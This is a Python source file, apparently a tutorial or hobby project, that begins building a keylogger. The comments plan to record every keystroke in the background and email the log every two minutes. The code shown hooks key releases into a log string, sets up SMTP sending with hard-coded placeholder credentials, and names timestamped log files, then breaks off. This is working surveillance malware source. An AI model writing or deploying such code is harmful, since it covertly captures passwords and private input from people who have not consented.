# listen to keystrokes in the background
# whenever a key is pressed, add it to global string variable
# every X number of minutes, write this string to local file or email

# look into 'keyloggers' module

import keyboard
import smtplib

from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_INTERVAL = 120 # number of seconds to send the string
EMAIL_ADDRESS = "dwight.schrute@dundermifflin.com"
EMAIL_PASSWORD = "bearsbeetsbattlestargalactica"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method

        self.log = ""   # stores the keystrokes

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        # this is called whenever a key is released
        name = event.name

        if len(name) > 1:

            if name == "space":
                name = " "

            elif name == "enter":
                name = "[ENTER]\n"

            elif name == "decimal":
                name = "."

            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        
        self.log += name


    # create a log file in current working directory that has current keylogs in 'self.log' variable
    def update_filename(self):

        # filename is made with start and end timestamps
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
        